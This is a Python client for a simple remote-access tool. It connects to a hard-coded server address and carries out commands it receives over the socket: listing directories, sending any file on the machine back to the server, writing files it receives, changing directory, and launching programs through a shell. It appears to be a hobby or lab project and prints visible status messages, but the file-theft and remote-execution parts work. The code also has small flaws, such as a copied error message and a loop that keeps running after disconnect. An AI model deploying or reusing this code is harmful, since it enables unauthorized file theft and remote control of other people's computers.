import os
import socket
import subprocess

os.system("cls")

s = socket.socket()
port = 8080
host = "192.168.56.1"  # Replace with the IP of the server
s.connect((host, port))

print("\n" + "Connected to Server successfully" + "\n")

def send_file(file_path):
    try:
        with open(file_path, "rb") as file:
            file_data = file.read()
        s.sendall(file_data)
        print("File sent successfully")
    except Exception as e:
        print("Error sending file:", e)

def receive_file(file_path):
    try:
        with open(file_path, "wb") as file:
            while True:
                data = s.recv(1024)
                if not data:
                    break
                file.write(data)
        print("File received successfully")
    except Exception as e:
        print("Error receiving file:", e)

while True:
    command = s.recv(1024).decode().strip()

    if command == "view_cwd":
        files = os.getcwd()
        files = str(files)
        s.send(files.encode())
        print("")
        print("Command has been executed successfully")
        print("")
    elif command == "custom_dir":
        user_input = s.recv(5000)
        user_input = user_input.decode()
        files = os.listdir(user_input)
        files = str(files)
        s.send(files.encode())
        print("")
        print("Command has been executed successfully")
        print("")
    elif command.startswith("send_a"):
        file_path = command.split(maxsplit=1)[1]
        send_file(file_path)
    elif command.startswith("download_"):
        file_name = command.split(maxsplit=1)[1]
        receive_file(file_name)
    elif command == "change_dir":
        new_dir = s.recv(5000)
        new_dir = new_dir.decode()
        try:
            os.chdir(new_dir)
            result = "Directory changed to " + os.getcwd()
        except Exception as e:
            result = "Error changing directory: " + str(e)
        s.send(result.encode())
    elif command == "play_music":
        music_name = s.recv(5000).decode()
        try:
            subprocess.Popen(["start", music_name], shell=True)
            print("Music started playing")
        except Exception as e:
            print("Error playing music:", e)
    elif command == "stop_playing_music":
        try:
            subprocess.run(["taskkill", "/im", "wmplayer.exe", "/f"], shell=True)
            print("Music stopped playing")
        except Exception as e:
            print("Error stopping music:", e)
    elif command == "disconnect":
        try:
            s.close()
        except Exception as e:
            print("Error stopping music:", e)
    else:
        print("Command not recognised !\nPlease try again :D")

